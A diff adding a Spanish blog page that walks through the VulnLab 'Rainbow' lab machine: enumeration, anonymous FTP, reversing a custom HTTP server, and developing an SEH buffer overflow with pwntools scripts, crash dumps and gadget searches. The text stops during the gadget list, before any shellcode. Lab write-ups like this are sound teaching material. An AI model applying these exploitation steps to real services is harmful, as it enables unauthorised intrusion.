@@ -1,0 +1,935 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup VulnLab Rainbow</title>
+
+  <meta name="description" content="Resolución de la máquina Rainbow de la plataforma de VulnLab">
+  <meta name="author" content="xchg2pwn">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup VulnLab Rainbow">
+  <meta name="twitter:description" content="Resolución de la máquina Rainbow de la plataforma de VulnLab">
+  <meta name="twitter:creator" content="xchg2pwn">  
+  <meta name="twitter:image" content="/images/otros/rainbow.png" />
+
+  <meta property="og:site_name" content="xchg2pwn" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup VulnLab Rainbow">
+  <meta property="og:description" content="Resolución de la máquina Rainbow de la plataforma de VulnLab">
+  <meta property="og:image" content="/images/otros/rainbow.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/otros/rainbow.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup VulnLab Rainbow" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
+          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/vulnlab" title="xchg2pwn" class="blog-button">VulnLab</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+
+              <li class="navigation__item grow">
+                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/enrique-de-los-santos-694863233" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>              
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-rainbow">Shell - rainbow</a></li>
+        <li><a href="#shell-system">Shell - system</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">VulnLab</h4>
+    <picture><img src="/images/otros/rainbow.png" style="float: right; margin-right:0px; margin-left:0px; height:80px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Rainbow</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, entre ellos el <code class="language-plaintext highlighter-rouge">21</code> que corre un servicio <code class="language-plaintext highlighter-rouge">ftp</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.122.10
+Nmap scan report for 10.10.122.10  
+PORT     STATE SERVICE
+21/tcp   open  ftp
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+8080/tcp open  http-proxy</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esta abierto el puerto <code class="language-plaintext highlighter-rouge">80</code> con un servicio <code class="language-plaintext highlighter-rouge">http</code> sin embargo si lo abrimos la web en el navegador nos muestra simplemente la página que viene por defecto en los <code class="language-plaintext highlighter-rouge">IIS</code></p>
+<a href="/vulnlab/rainbow/1.png" target="_blank"><div><p><img src="/vulnlab/rainbow/1.png"></p></div></a>
+
+<p class="plain-text">Ya que esta abierto iniciaremos por conectarnos a <code class="language-plaintext highlighter-rouge">ftp</code>, en este caso admite la autenticacion por defecto del usuario <code class="language-plaintext highlighter-rouge">anonymous</code> sin proporcionar contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ftp </span><span class="p">10.10.122.10
+Connected to 10.10.122.10.
+220 Microsoft FTP Service
+Name (10.10.122.10:user): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.  
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Dentro encontramos 3 archivos, un <code class="language-plaintext highlighter-rouge">.txt</code>, un ejecutable <code class="language-plaintext highlighter-rouge">.exe</code> y un script <code class="language-plaintext highlighter-rouge">.ps1</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ftp> dir
+229 Entering Extended Passive Mode (|||50101|)
+150 Opening ASCII mode data connection.
+01-18-22  08:22AM                  258 dev.txt
+01-18-22  08:30AM                54784 rainbow.exe  
+01-16-22  01:34PM                  479 restart.ps1  
+01-16-22  12:14PM       &ltDIR>          wwwroot
+226 Transfer complete.
+ftp></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El archivo <code class="language-plaintext highlighter-rouge">dev.txt</code> nos dice que debido a algunos problemas con el servicio se creó un script que lo reinicia cada cierto tiempo en un puerto entre <code class="language-plaintext highlighter-rouge">8080</code> y <code class="language-plaintext highlighter-rouge">8090</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat</span><span class="p"> dev.txt
+* Our webserver has been crashing a lot lately. Instead of touching the code we added a restart script!  
+* The server will dynamically pick a port when its default port is unresponsive (8080-8090).
+* We'll fix this later by adding load balancer.
+
+- dev team</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El script se ejecuta en un bucle infinito, ejecutando parando el proceso si existe y lo ejecuta de nuevo, luego espera <code class="language-plaintext highlighter-rouge">30</code> segundos y vuelve al bucle para ejecutarlo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cat </span><span class="p">restart.ps1
+</span><span class="no">Set-Location</span><span class="o"> -</span><span class="p">Path C:\rainbow
+</span><span class="o">for</span><span class="p"> (;;) {
+    </span><span class="o">try</span><span class="p"> {
+        </span><span class="o">If</span><span class="p"> (</span><span class="o">!</span><span class="p">(</span><span class="no">Get-Process</span><span class="o"> -</span><span class="p">Name rainbow </span><span class="o">-</span><span class="p">ErrorAction SilentlyContinue)) {
+            </span><span class="no">Invoke-Expression</span><span class="s"> "C:\rainbow\rainbow.exe"</span><span class="p">
+        }
+
+        $proc </span><span class="o">= </span><span class="no">Get-Process</span><span class="o"> -</span><span class="p">Name rainbow</span><span class="o"> |</span><span class="no"> Sort-Object</span><span class="o"> -</span><span class="p">Property ProcessName </span><span class="o">-</span><span class="p">Unique </span><span class="o">-</span><span class="p">ErrorAction SilentlyContinue  
+        </span><span class="o">If</span><span class="p"> (</span><span class="o">!</span><span class="p">$proc</span><span class="o"> -or</span><span class="p"> ($proc.Responding </span><span class="o">-eq</span><span class="mi"> $</span><span class="mi">false</span><span class="p">) –or ($proc.WorkingSet </span><span class="o">-GT</span><span class="mi"> 200000</span><span class="o">*</span><span class="mi">1024</span><span class="p">)) {
+            $proc.Kill()
+            </span><span class="no">Start-Sleep</span><span class="o"> -</span><span class="p">s</span><span class="mi"> 10
+            </span><span class="no">Invoke-Expression</span><span class="s"> "C:\rainbow\rainbow.exe"</span><span class="p">
+        }
+    }</span><span class="o"> catch</span><span class="p"> { }
+
+    </span><span class="no">Start-sleep</span><span class="o"> -</span><span class="p">s</span><span class="mi"> 30</span><span class="p">
+}</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el binario se nos muestra que se ha iniciado un servidor en algun puerto</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\user\Desktop> </span><span class="am">.\rainbow.exe  </span><span class="p">
+Starting Rainbow Server...!</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">De primeras no conocemos el puerto que ha abierto pero con <a href="https://learn.microsoft.com/es-es/sysinternals/downloads/tcpview">TCPView</a> podemos ver que el proceso <code class="language-plaintext highlighter-rouge">rainbow.exe</code> tiene abierto el puerto <code class="language-plaintext highlighter-rouge">8080</code> en la dirección <code class="language-plaintext highlighter-rouge">0.0.0.0</code></p>
+<a href="/vulnlab/rainbow/2.png" target="_blank"><div><p><img src="/vulnlab/rainbow/2.png"></p></div></a>
+
+</section>
+<section class="post" id="shell-rainbow">
+<br><h3 class="post-title">Shell - rainbow</h3><br>
+
+<p class="plain-text">Para poder depurar el programa facilmente abriremos la aplicación dentro de <code class="language-plaintext highlighter-rouge">WinDbg</code></p>
+<a href="/vulnlab/rainbow/3.png" target="_blank"><div><p><img src="/vulnlab/rainbow/3.png"></p></div></a>
+
+<p class="plain-text">Si miramos los detalles del módulo con <code class="language-plaintext highlighter-rouge">mona</code> podemos ver que no contiene ninguna protección por lo que a la hora de hacer un exploit deberia ser relativamente sencillo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> !py mona modules
+Hold on...
+[+] Command used:
+!py C:\Users\user\Documents\WinDbgX\x86\mona.py modules
+
+[+] Processing arguments and criteria
+    - Pointer access level : X
+[+] Generating module info table, hang on...
+    - Processing modules
+    - Done. Let's rock 'n roll.
+-------------------------------------------------------------------------------------------------------------------------------------------------------------  
+ Module info :
+-------------------------------------------------------------------------------------------------------------------------------------------------------------  
+ Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Modulename & Path
+-------------------------------------------------------------------------------------------------------------------------------------------------------------  
+ 0x73810000 | 0x73823000 | 0x00013000 | True   | False   | True  | True  |  True    | True   | [kernel.appcore.dll] (C:\Windows\SysWOW64\kernel.appcore.dll)
+ 0x75eb0000 | 0x76132000 | 0x00282000 | True   | False   | True  | True  |  True    | True   | [KERNELBASE.dll] (C:\Windows\SysWOW64\KERNELBASE.dll)
+ 0x73da0000 | 0x73e0d000 | 0x0006d000 | True   | True    | True  | True  |  True    | True   | [MSVCP140.dll] (C:\Windows\SysWOW64\MSVCP140.dll)
+ 0x76d90000 | 0x76ea2000 | 0x00112000 | True   | True    | True  | True  |  True    | True   | [ucrtbase.dll] (C:\Windows\SysWOW64\ucrtbase.dll)
+ 0x00400000 | 0x00411000 | 0x00011000 | False  | False   | False | False |  False   | False  | [rainbow.exe] (Rainbow.exe)
+ 0x757b0000 | 0x758a0000 | 0x000f0000 | True   | False   | True  | True  |  True    | True   | [KERNEL32.DLL] (C:\Windows\SysWOW64\KERNEL32.DLL)
+ 0x76b80000 | 0x76c44000 | 0x000c4000 | True   | False   | True  | True  |  True    | True   | [msvcrt.dll] (C:\Windows\SysWOW64\msvcrt.dll)
+ 0x75320000 | 0x75335000 | 0x00015000 | True   | True    | True  | True  |  True    | True   | [VCRUNTIME140.dll] (C:\Windows\SysWOW64\VCRUNTIME140.dll)
+ 0x77770000 | 0x77922000 | 0x001b2000 | True   | False   | True  | True  |  True    | True   | [ntdll.dll] (ntdll.dll)
+ 0x75400000 | 0x754ba000 | 0x000ba000 | True   | False   | True  | True  |  True    | True   | [RPCRT4.dll] (C:\Windows\SysWOW64\RPCRT4.dll)
+ 0x774c0000 | 0x7751f000 | 0x0005f000 | True   | False   | True  | True  |  True    | True   | [WS2_32.dll] (C:\Windows\SysWOW64\WS2_32.dll)
+ 0x72ec0000 | 0x72f11000 | 0x00051000 | True   | False   | True  | True  |  True    | True   | [mswsock.dll] (C:\Windows\SysWOW64\mswsock.dll)
+-------------------------------------------------------------------------------------------------------------------------------------------------------------  
+
+[+] Preparing output file 'modules.txt'
+    - (Re)setting logfile C:\mona\modules.txt</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La parte mas compleja aqui es la del reversing debido a que el programa se creó en <code class="language-plaintext highlighter-rouge">C++</code> y el tema de los objetos hace que sea más dificil leer el código, luego de renombrar algunas cosas iniciamos con la función <code class="language-plaintext highlighter-rouge">main</code>, el bloque inicial inicia mostrando un mensaje con <code class="language-plaintext highlighter-rouge">printf</code> indicando que se inició un servidor</p>
+<a href="/vulnlab/rainbow/4.png" target="_blank"><div><p><img src="/vulnlab/rainbow/4.png"></p></div></a>
+
+<p class="plain-text">Luego ejecuta un bucle donde inicia un servidor en el host <code class="language-plaintext highlighter-rouge">0.0.0.0</code> y un puerto entre el <code class="language-plaintext highlighter-rouge">8080</code> y el <code class="language-plaintext highlighter-rouge">8090</code>, si un puerto está ocupado es posible que lo inicie en el siguiente</p>
+<a href="/vulnlab/rainbow/5.png" target="_blank"><div><p><img src="/vulnlab/rainbow/5.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">server</code> inicia llamando a la función <code class="language-plaintext highlighter-rouge">WSAStartup</code> para inicializar winsock y luego llama a la función <code class="language-plaintext highlighter-rouge">socket</code> para crear un socket y este devuelve un descriptor</p>
+<a href="/vulnlab/rainbow/6.png" target="_blank"><div><p><img src="/vulnlab/rainbow/6.png"></p></div></a>
+
+<p class="plain-text">Luego utiliza <code class="language-plaintext highlighter-rouge">htons</code> para darle formato al puerto y posteriormente llamar a <code class="language-plaintext highlighter-rouge">bind</code> para asociar una dirección local a un socket, y finalmente a la función <code class="language-plaintext highlighter-rouge">setsockopt</code></p>
+<a href="/vulnlab/rainbow/7.png" target="_blank"><div><p><img src="/vulnlab/rainbow/7.png"></p></div></a>
+
+<p class="plain-text">Luego llama a <code class="language-plaintext highlighter-rouge">listen</code> para ponerse en escucha de conexiones entrantes en el puerto</p>
+<a href="/vulnlab/rainbow/8.png" target="_blank"><div><p><img src="/vulnlab/rainbow/8.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">handler</code> inicia realizando un salto condicional ya que se iniciará un bucle</p>
+<a href="/vulnlab/rainbow/9.png" target="_blank"><div><p><img src="/vulnlab/rainbow/9.png"></p></div></a>
+
+<p class="plain-text">En este caso se llama a la función select para verificar que los descriptores en la variable <code class="language-plaintext highlighter-rouge">readfs</code> esten listos para operaciones evitando asi errores de <code class="language-plaintext highlighter-rouge">I/O</code></p>
+<a href="/vulnlab/rainbow/10.png" target="_blank"><div><p><img src="/vulnlab/rainbow/10.png"></p></div></a>
+
+<p class="plain-text">Si el valor devuelto por <code class="language-plaintext highlighter-rouge">select</code> es mayor a <code class="language-plaintext highlighter-rouge">0</code> sigue la linea roja que llama a <code class="language-plaintext highlighter-rouge">accept</code> que recibe una conexión y devuelve un nuevo descriptor en el valor de retorno</p>
+<a href="/vulnlab/rainbow/11.png" target="_blank"><div><p><img src="/vulnlab/rainbow/11.png"></p></div></a>
+
+<p class="plain-text">Si se sigue la linea verde llama a <code class="language-plaintext highlighter-rouge">memset</code> para reservar un espacio en memoria y luego a <code class="language-plaintext highlighter-rouge">recv</code> para recibir un total de <code class="language-plaintext highlighter-rouge">0x1000</code> o <code class="language-plaintext highlighter-rouge">4096</code> bytes en el buffer asignado</p>
+<a href="/vulnlab/rainbow/12.png" target="_blank"><div><p><img src="/vulnlab/rainbow/12.png"></p></div></a>
+
+<p class="plain-text">La función que se encarga de controlar las conexiones realiza una comparación de una variable <code class="language-plaintext highlighter-rouge">method</code> contra la string <code class="language-plaintext highlighter-rouge">GET</code> que es un método para peticiones <code class="language-plaintext highlighter-rouge">HTTP</code></p>
+<a href="/vulnlab/rainbow/13.png" target="_blank"><div><p><img src="/vulnlab/rainbow/13.png"></p></div></a>
+
+<p class="plain-text">Si es asi muestra un mensaje en la terminal y compara la ruta con la string <code class="language-plaintext highlighter-rouge">/</code></p>
+<a href="/vulnlab/rainbow/14.png" target="_blank"><div><p><img src="/vulnlab/rainbow/14.png"></p></div></a>
+
+<p class="plain-text">Si es igual retorna el contenido del <code class="language-plaintext highlighter-rouge">/index.html</code>, si no es asi lo compara con el método <code class="language-plaintext highlighter-rouge">POST</code> realizando la misma comparación asi que sabemos que recibe peticiones <code class="language-plaintext highlighter-rouge">HTTP</code></p>
+<a href="/vulnlab/rainbow/15.png" target="_blank"><div><p><img src="/vulnlab/rainbow/15.png"></p></div></a>
+
+<p class="plain-text">Lo que enviamos en las solicitudes <code class="language-plaintext highlighter-rouge">HTTP</code> las controla un binario personalizado, podemos probar enviar una cantidad grande de datos para corromperlo, si lo enviamos en peticiones <code class="language-plaintext highlighter-rouge">GET</code> no lo hace pero como data de una petición <code class="language-plaintext highlighter-rouge">POST</code> si</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ curl</span><span class="p"> -X GET 192.168.100.5:8080/</span><span class="sa">$(</span><span class="ve">python3 </span><span class="p">-c</span><span class="am"> 'print("A" * 1000)'</span><span class="sa">)
+</span><span class="p">&lthtml>&lth1>404 Not Found&lt/h1>&lt/html>
+
+</span><span class="ve">❯ curl</span><span class="p"> -X POST 192.168.100.5:8080/ -d </span><span class="sa">$(</span><span class="ve">python3</span><span class="p"> -c </span><span class="am">'print("A" * 1000)'</span><span class="sa">)  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Si miramos desde el debugger el programa corrompe pero no tenemos el control del registro de <code class="language-plaintext highlighter-rouge">eip</code>, sin embargo si sobrescribimos los valores de la estructura <code class="language-plaintext highlighter-rouge">SEH</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> g
+(3fc8.38e8): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=fffffffc ebx=005a5f28 ecx=41414141 edx=00000004 esi=004020c0 edi=005a5f28
+eip=00406156 esp=00bcf8c8 ebp=00bcf8d8 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
+Rainbow+0x6156:
+00406156 8b1401          mov     edx,dword ptr [ecx+eax] ds:002b:4141413d=????????  
+
+</span><span class="ro">0:000></span><span class="p"> !exchain
+00bcf8e8: Rainbow+a040 (0040a040)
+00bcf928: Rainbow+a040 (0040a040)
+00bcfbe8: 41414141
+Invalid exception stack at 41414141</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En lugar de <code class="language-plaintext highlighter-rouge">A's</code> enviaremos un patrón con <code class="language-plaintext highlighter-rouge">cyclic</code> para buscar el offset para llegar a sobrescribir la estructura con valores que son parte de la cadena creada con <code class="language-plaintext highlighter-rouge">cyclic</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p32, cyclic
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> cyclic(</span><span class="mi">1000</span><span class="p">)
+
+content</span><span class="o"> =</span><span class="no"> b</span><span class="s">"POST / HTTP/1.1</span><span class="mi">\r\n</span><span class="s">" </span><span class="o">+ </span><span class="p">payload  
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 8080</span><span class="p">)
+shell.send(content)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> g
+(4394.38f8): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=fffffffc ebx=005e4e40 ecx=6661616a edx=00000004 esi=004020c0 edi=005e4e40
+eip=00406156 esp=00a8f8c8 ebp=00a8f8d8 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
+Rainbow+0x6156:
+00406156 8b1401          mov     edx,dword ptr [ecx+eax] ds:002b:66616166=????????  
+
+</span><span class="ro">0:000></span><span class="p"> !exchain
+00a8f8e8: Rainbow+a040 (0040a040)
+00a8f928: Rainbow+a040 (0040a040)
+00a8fbe8: 67616171
+Invalid exception stack at 67616170</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Le pasamos el valor a <code class="language-plaintext highlighter-rouge">cyclic</code> que nos dice que offset para sobrescribir el puntero al siguiente <code class="language-plaintext highlighter-rouge">SEH</code> es de <code class="language-plaintext highlighter-rouge">660</code> bytes, y para sobrescribir el <code class="language-plaintext highlighter-rouge">SEH</code> handler <code class="language-plaintext highlighter-rouge">664</code> bytes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ cyclic </span><span class="p">-l 0x67616170  
+660
+
+</span><span class="ve">❯ cyclic </span><span class="p">-l 0x67616171  
+664</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuestro payload ahora enviará <code class="language-plaintext highlighter-rouge">660 A's</code> hasta antes de sobrescribir la estructura SEH, <code class="language-plaintext highlighter-rouge">4 B's</code> que serán el siguiente SEH y <code class="language-plaintext highlighter-rouge">4 C's</code> que serán el controlador, ademas de ello rellenamos con <code class="language-plaintext highlighter-rouge">D's</code> hasta llegar a <code class="language-plaintext highlighter-rouge">1000</code> bytes para mantener el exploit estable forzando que ocurra la excepción enviando una cantidad muy grande de bytes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> remote, p32
+
+offset</span><span class="o"> =</span><span class="mi"> 660</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
+
+nseh</span><span class="o"> =</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+seh</span><span class="o"> =</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> nseh</span><span class="o"> +</span><span class="p"> seh
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="p"> (</span><span class="mi">1000</span><span class="o"> -</span><span class="no"> len</span><span class="p">(payload))
+
+content</span><span class="o"> =</span><span class="no"> b</span><span class="s">"POST / HTTP/1.1</span><span class="mi">\r\n</span><span class="s">" </span><span class="o">+ </span><span class="p">payload  
+
+shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"192.168.100.5"</span><span class="p">,</span><span class="mi"> 8080</span><span class="p">)
+shell.send(content)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al enviar el exploit el programa corrompe pero ahora controlamos la estructura SEH con el siguiente SEH con el valor <code class="language-plaintext highlighter-rouge">0x42424242</code> y el controlador con <code class="language-plaintext highlighter-rouge">0x43434343</code>, si continuamos al ejecutar la excepción eventualmente controlaremos el registro <code class="language-plaintext highlighter-rouge">eip</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> g
+(1734.1060): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=fffffffc ebx=004b4e58 ecx=41414141 edx=00000004 esi=004020c0 edi=004b4e58
+eip=00406156 esp=00a8f8c8 ebp=00a8f8d8 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
+Rainbow+0x6156:
+00406156 8b1401          mov     edx,dword ptr [ecx+eax] ds:002b:4141413d=????????  
+
+</span><span class="ro">0:000></span><span class="p"> !exchain
+00a8f8e8: Rainbow+a040 (0040a040)
+00a8f928: Rainbow+a040 (0040a040)
+00a8fbe8: 43434343
+Invalid exception stack at 42424242
+
+</span><span class="ro">0:000></span><span class="p"> g
+(1734.1060): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=00000000 ecx=43434343 edx=77809de0 esi=00000000 edi=00000000
+eip=43434343 esp=00a8f310 ebp=00a8f330 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+43434343 ??              ???</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Algo a tener en cuenta es que cuando ocurre la excepción los valores del SEH se mueven al <code class="language-plaintext highlighter-rouge">stack</code> parecido a cuando se llama a una función, lo que nos interesa es que en la dirección <code class="language-plaintext highlighter-rouge">esp + 8</code> se encuentra el puntero hacia el siguiente SEH</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">0:000></span><span class="p"> dds esp L3
+00a8f310  77809dc2 ntdll!ExecuteHandler2+0x26
+00a8f314  00a8f410
+00a8f318  00a8fbe8
+
+</span><span class="ro">0:000></span><span class="p"> db poi(esp + 8)
+00a8fbe8  42 42 42 42 43 43 43 43-05 44 44 44 44 44 44 44  BBBBCCCC.DDDDDDD  
+00a8fbf8  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD  
+00a8fc08  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD  
+00a8fc18  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD  
+00a8fc28  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD  
+00a8fc38  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD  
+00a8fc48  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD  
+00a8fc58  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces lo que podemos hacer es ejecutar un <code class="language-plaintext highlighter-rouge">pop; pop; ret;</code> para ejecutar como instrucciones el valor del <code class="language-plaintext highlighter-rouge">nseh</code>, podemos encontrar uno con la herramienta <code class="language-plaintext highlighter-rouge">ropper</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ropper </span><span class="p">--file rainbow.exe --ppr
+
+POP;POP;RET Instructions
+========================
+
+</span><span class="ro">0x004091b7</span><span class="p">:</span><span class="am"> pop</span><span class="p"> edi</span><span class="az">; </span><span class="am">pop</span><span class="p"> esi</span><span class="az">; </span><span class="am">ret</span><span class="az">;
+</span><span class="ro">0x004092ad</span><span class="p">:</span><span class="am"> pop</span><span class="p"> ecx</span><span class="az">; </span><span class="am">pop</span><span class="p"> ebp</span><span class="az">; </span><span class="am">ret</span><span class="az">;
+</span><span class="ro">0x004094d8</span><span class="p">:</span><span class="am"> pop</span><span class="p"> ecx</span><span class="az">; </span><span class="am">pop</span><span class="p"> ecx</span><span class="az">; </span><span class="am">ret</span><span class="az">;
